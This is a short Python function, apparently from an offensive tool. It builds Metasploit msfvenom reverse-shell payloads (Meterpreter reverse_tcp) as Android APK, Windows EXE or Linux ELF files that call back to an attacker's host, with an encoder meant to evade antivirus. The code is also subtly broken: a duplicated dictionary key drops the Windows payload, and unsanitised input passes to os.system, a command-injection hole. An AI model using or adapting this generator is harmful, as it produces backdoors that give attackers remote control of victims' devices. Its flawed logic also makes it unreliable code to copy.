def generate_payload(platform, lhost, lport, outfile):
    import os

    arch = input("Architecture (x86/x64): ").strip()
    encoder = input("Encoder (e.g., x86/shikata_ga_nai): ").strip()

    payloads = {
        "1": "android/meterpreter/reverse_tcp",
        "3": "windows/meterpreter/reverse_tcp",
        "3": "linux/x86/meterpreter/reverse_tcp"
    }

    formats = {
        "1": "apk",
        "2": "exe",
        "3": "elf"
    }

    payload = payloads.get(platform, "windows/meterpreter/reverse_tcp")
    outformat = formats.get(platform, "exe")
    filename = f"{outfile}.{outformat}"

    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e {encoder} -a {arch} --platform {platform} -f {outformat} -o {filename}"
    print(f"[+] Running: {command}")
    os.system(command)
    return payload, outformat
